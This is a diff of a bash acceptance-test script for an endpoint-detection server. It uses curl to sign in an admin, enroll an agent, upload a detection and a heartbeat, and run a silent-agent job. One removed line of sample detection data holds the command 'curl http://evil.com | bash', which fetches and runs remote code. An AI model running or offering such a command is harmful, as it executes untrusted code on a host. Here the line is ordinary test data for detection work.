@@ -1,70 +1,123 @@
 #!/bin/bash
-# Acceptance Tests for Issue #28
-# Tests the three acceptance criteria with a running server
+# Acceptance walk through a running server with curl: an admin enrolls an agent, the agent uploads
+# a detection and a heartbeat, the silent-agent job runs, and the console answers the session.
+#
+# It talks to the server the way production traffic reaches it:
+# - enrollment is an admin action (`requireTenantAdmin`), so the script signs in with a tenant
+#   admin's email and password and makes that tenant its session's active organization;
+# - agent routes trust the mTLS headers only when the request carries nginx's proxy secret
+#   (`verifyProxyAuth`), so agent calls send `X-Proxy-Secret` with the mTLS headers nginx would
+#   set. Point SERVER_URL at the Next.js server itself, not at nginx.
+#
+# Required:
+#   E2E_EMAIL, E2E_PASSWORD  a user who is `owner` or `admin` of a tenant. To create one on a fresh
+#                            stack, see "The acceptance script" in docs/testing.md.
+# Optional:
+#   SERVER_URL           default http://localhost:3000
+#   CRON_SECRET          default dev_cron_secret (.env.example)
+#   NGINX_PROXY_SECRET   default dev_nginx_secret_change_in_production (.env.example)
+#   E2E_TENANT_ID        the tenant to act in; default: the user's first organization
+#   SKIP_DOCKER_CHECK    set to skip the container checks of test 3
 
-set -e
+set -eu
 
-# Colors for output
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
-NC='\033[0m' # No Color
+NC='\033[0m'
 
-# Configuration
 SERVER_URL="${SERVER_URL:-http://localhost:3000}"
 CRON_SECRET="${CRON_SECRET:-dev_cron_secret}"
+NGINX_PROXY_SECRET="${NGINX_PROXY_SECRET:-dev_nginx_secret_change_in_production}"
 ENROLLMENT_ID="agent-acceptance-test-001"
 
+print_success() { echo -e "${GREEN}✓ $1${NC}"; }
+print_error() { echo -e "${RED}✗ $1${NC}"; }
+print_info() { echo -e "${YELLOW}→ $1${NC}"; }
+
+if [ -z "${E2E_EMAIL:-}" ] || [ -z "${E2E_PASSWORD:-}" ]; then
+    print_error "E2E_EMAIL and E2E_PASSWORD (a tenant admin) are required; see the header of this script"
+    exit 2
+fi
+
+COOKIES=$(mktemp)
+trap 'rm -f "$COOKIES"' EXIT
+
+# better-auth checks the Origin of cookie-authenticated calls against `trustedOrigins` (lib/auth.ts).
+session_curl() {
+    curl -s -b "$COOKIES" -c "$COOKIES" -H "Origin: $SERVER_URL" -H "Content-Type: application/json" "$@"
+}
+
+# What nginx sets on an agent request after verifying its client certificate (nginx.conf).
+agent_curl() {
+    curl -s \
+        -H "X-Proxy-Secret: $NGINX_PROXY_SECRET" \
+        -H "X-Client-Cert-Verified: SUCCESS" \
+        -H "X-Client-Cert-Subject: CN=$ENROLLMENT_ID,O=synthaea" \
+        "$@"
+}
+
 echo "======================================"
-echo "  Synthaea Issue #28 Acceptance Tests"
+echo "  Synthaea acceptance tests"
 echo "======================================"
 echo ""
 echo "Server: $SERVER_URL"
 echo ""
 
-# Helper functions
-print_success() {
-    echo -e "${GREEN}✓ $1${NC}"
-}
-
-print_error() {
-    echo -e "${RED}✗ $1${NC}"
-}
-
-print_info() {
-    echo -e "${YELLOW}→ $1${NC}"
-}
-
-# Check if server is running
 print_info "Checking server health..."
 if ! curl -sf "$SERVER_URL/api/health" > /dev/null; then
     print_error "Server not responding at $SERVER_URL"
-    print_info "Start server with: docker-compose up"
+    print_info "Start server with: docker compose up"
     exit 1
 fi
 print_success "Server is healthy"
 echo ""
 
-# Test 1: Agent enrolls, uploads detection, appears in console
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo "Test 1: Agent enrollment → detection → console"
+echo "Test 1: Admin session → agent enrollment → detection → console"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo ""
 
-# Step 1: Enroll agent
+print_info "Signing in as $E2E_EMAIL"
+SIGNIN_RESPONSE=$(session_curl -X POST "$SERVER_URL/api/auth/sign-in/email" \
+    -d "{\"email\": \"$E2E_EMAIL\", \"password\": \"$E2E_PASSWORD\"}")
+if grep -q '"token"' <<< "$SIGNIN_RESPONSE"; then
+    print_success "Signed in"
+else
+    print_error "Sign-in failed"
+    echo "   Response: $SIGNIN_RESPONSE"
+    exit 1
+fi
+
+TENANT_ID="${E2E_TENANT_ID:-}"
+if [ -z "$TENANT_ID" ]; then
+    ORGS=$(session_curl "$SERVER_URL/api/auth/organization/list")
+    TENANT_ID=$(grep -o '"id":"[^"]*"' <<< "$ORGS" | head -1 | cut -d'"' -f4 || true)
+fi
+if [ -z "$TENANT_ID" ]; then
+    print_error "$E2E_EMAIL belongs to no tenant"
+    exit 1
+fi
+ACTIVE_RESPONSE=$(session_curl -X POST "$SERVER_URL/api/auth/organization/set-active" \
+    -d "{\"organizationId\": \"$TENANT_ID\"}")
+if grep -q "\"id\":\"$TENANT_ID\"" <<< "$ACTIVE_RESPONSE"; then
+    print_success "Active tenant: $TENANT_ID"
+else
+    print_error "Could not make $TENANT_ID the active tenant"
+    echo "   Response: $ACTIVE_RESPONSE"
+    exit 1
+fi
+echo ""
+
 print_info "Enrolling agent: $ENROLLMENT_ID"
-ENROLL_RESPONSE=$(curl -s -X POST "$SERVER_URL/api/enrollment" \
-    -H "X-Client-Cert-Verified: SUCCESS" \
-    -H "X-Client-Cert-Subject: CN=$ENROLLMENT_ID,O=synthaea" \
-    -H "Content-Type: application/json" \
+ENROLL_RESPONSE=$(session_curl -X POST "$SERVER_URL/api/enrollment" \
     -d "{
         \"enrollmentId\": \"$ENROLLMENT_ID\",
         \"hostname\": \"acceptance-test-vm\",
         \"version\": \"0.1.0\"
     }")
-
-if echo "$ENROLL_RESPONSE" | grep -q "enrolled\|already_enrolled"; then
-    print_success "Agent enrolled successfully"
+if grep -q '"status":"\(already_\)\?enrolled"' <<< "$ENROLL_RESPONSE"; then
+    print_success "Agent enrolled"
     echo "   Response: $ENROLL_RESPONSE"
 else
     print_error "Agent enrollment failed"
@@ -73,12 +126,9 @@ else
 fi
 echo ""
 
-# Step 2: Upload detection
-print_info "Uploading detection from agent"
+print_info "Uploading a detection from the agent"
 TIMESTAMP_NS=$(date +%s)000000000
-DETECTION_RESPONSE=$(curl -s -X POST "$SERVER_URL/api/ingest/detection" \
-    -H "X-Client-Cert-Verified: SUCCESS" \
-    -H "X-Client-Cert-Subject: CN=$ENROLLMENT_ID,O=synthaea" \
+DETECTION_RESPONSE=$(agent_curl -X POST "$SERVER_URL/api/ingest/detection" \
     -H "Content-Type: application/json" \
     -d "{
         \"timestamp_ns\": $TIMESTAMP_NS,
@@ -87,16 +137,15 @@ DETECTION_RESPONSE=$(curl -s -X POST "$SERVER_URL/api/ingest/detection" \
         \"event\": {
             \"type\": \"exec\",
             \"comm\": \"bash\",
-            \"cmdline\": \"bash -c 'curl http://evil.com | bash'\"
+            \"cmdline\": \"bash -c acceptance-test\"
         },
         \"meta\": {
             \"hostname\": \"acceptance-test-vm\",
             \"user\": \"root\"
         }
     }")
-
-if echo "$DETECTION_RESPONSE" | grep -q "accepted"; then
-    print_success "Detection uploaded successfully"
+if grep -q '"status":"accepted"' <<< "$DETECTION_RESPONSE"; then
+    print_success "Detection accepted"
     echo "   Response: $DETECTION_RESPONSE"
 else
     print_error "Detection upload failed"
@@ -105,35 +154,28 @@ else
 fi
 echo ""
 
-# Step 3: Verify console access (requires authentication, so just check endpoint exists)
-print_info "Checking console endpoint availability"
-CONSOLE_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$SERVER_URL/console/cases")
-if [ "$CONSOLE_STATUS" = "200" ] || [ "$CONSOLE_STATUS" = "302" ]; then
-    print_success "Console endpoint accessible (HTTP $CONSOLE_STATUS)"
-    print_info "Note: Full verification requires browser login"
+print_info "Opening the console with the session"
+CONSOLE_STATUS=$(session_curl -o /dev/null -w "%{http_code}" "$SERVER_URL/console/cases")
+if [ "$CONSOLE_STATUS" = "200" ]; then
+    print_success "Console answers the session (HTTP 200)"
 else
-    print_error "Console endpoint not accessible (HTTP $CONSOLE_STATUS)"
+    print_error "Console did not answer the session (HTTP $CONSOLE_STATUS)"
     exit 1
 fi
 echo ""
 
-print_success "Test 1 PASSED: Agent enrollment and detection upload work"
+print_success "Test 1 PASSED: enrollment, detection upload and console"
 echo ""
 
-# Test 2: Heartbeat-silence detection
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo "Test 2: Heartbeat-silence detection"
+echo "Test 2: Heartbeat and silent-agent job"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo ""
 
-# Step 1: Send heartbeat
-print_info "Sending heartbeat from agent"
-HEARTBEAT_RESPONSE=$(curl -s -X POST "$SERVER_URL/api/ingest/heartbeat" \
-    -H "X-Client-Cert-Verified: SUCCESS" \
-    -H "X-Client-Cert-Subject: CN=$ENROLLMENT_ID,O=synthaea")
-
-if echo "$HEARTBEAT_RESPONSE" | grep -q "ok"; then
-    print_success "Heartbeat sent successfully"
+print_info "Sending a heartbeat from the agent"
+HEARTBEAT_RESPONSE=$(agent_curl -X POST "$SERVER_URL/api/ingest/heartbeat")
+if grep -q '"status":"ok"' <<< "$HEARTBEAT_RESPONSE"; then
+    print_success "Heartbeat accepted"
     echo "   Response: $HEARTBEAT_RESPONSE"
 else
     print_error "Heartbeat failed"
@@ -142,78 +184,45 @@ else
 fi
 echo ""
 
-# Step 2: Trigger silent agent detection cron
-print_info "Triggering silent agent detection cron"
-print_info "Note: In real scenario, wait 6 minutes for silence"
-CRON_RESPONSE=$(curl -s -X GET "$SERVER_URL/api/cron/detect-silent-agents" \
+print_info "Running the silent-agent job (an agent is silent after 5 minutes without a heartbeat)"
+CRON_RESPONSE=$(curl -s "$SERVER_URL/api/cron/detect-silent-agents" \
     -H "Authorization: Bearer $CRON_SECRET")
-
-if echo "$CRON_RESPONSE" | grep -q "silentAgents"; then
-    print_success "Silent agent detection cron executed"
+if grep -q '"silentAgents"' <<< "$CRON_RESPONSE"; then
+    print_success "Silent-agent job ran"
     echo "   Response: $CRON_RESPONSE"
 else
-    print_error "Cron job failed"
+    print_error "Silent-agent job failed"
     echo "   Response: $CRON_RESPONSE"
     exit 1
 fi
 echo ""
 
-print_success "Test 2 PASSED: Heartbeat and silence detection work"
+print_success "Test 2 PASSED: heartbeat and silent-agent job"
 echo ""
 
-# Test 3: Docker Compose stack health
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo "Test 3: Docker Compose dev stack health"
+echo "Test 3: Docker Compose dev stack"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo ""
 
-# Check if running in Docker Compose
-if [ -z "$SKIP_DOCKER_CHECK" ]; then
-    print_info "Checking Docker Compose services..."
-
-    if command -v docker-compose &> /dev/null; then
-        # Check PostgreSQL
-        if docker-compose ps postgres 2>/dev/null | grep -q "Up"; then
-            print_success "PostgreSQL container is running"
+if [ -z "${SKIP_DOCKER_CHECK:-}" ] && docker compose version > /dev/null 2>&1; then
+    for service in postgres server; do
+        if docker compose ps --status running "$service" 2>/dev/null | grep -q "$service"; then
+            print_success "$service container is running"
         else
-            print_error "PostgreSQL container not running"
+            print_error "$service container is not running"
         fi
-
-        # Check server
-        if docker-compose ps server 2>/dev/null | grep -q "Up"; then
-            print_success "Server container is running"
-        else
-            print_error "Server container not running"
-        fi
-
-        # Check proxy
-        if docker-compose ps proxy 2>/dev/null | grep -q "Up"; then
-            print_success "Nginx proxy container is running"
-        else
-            print_info "Nginx proxy not running (optional for dev)"
-        fi
+    done
+    if docker compose ps --status running proxy 2>/dev/null | grep -q proxy; then
+        print_success "nginx proxy container is running"
     else
-        print_info "docker-compose not found, skipping container checks"
+        print_info "nginx proxy not running (optional for dev)"
     fi
 else
-    print_info "Skipping Docker checks (SKIP_DOCKER_CHECK set)"
+    print_info "Skipping container checks (SKIP_DOCKER_CHECK set, or no docker compose)"
 fi
 echo ""
 
-print_success "Test 3 PASSED: Server stack is operational"
-echo ""
-
-# Final summary
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo -e "${GREEN}ALL ACCEPTANCE TESTS PASSED${NC}"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo ""
-echo "Summary:"
-echo "  ✓ Test 1: Agent enrollment and detection upload"
-echo "  ✓ Test 2: Heartbeat and silence detection"
-echo "  ✓ Test 3: Docker Compose stack health"
-echo ""
-echo "Manual verification:"
-echo "  → Open http://localhost:3000/console/cases to see detections"
-echo "  → Wait 6 minutes without heartbeat to test silence detection"
-echo ""
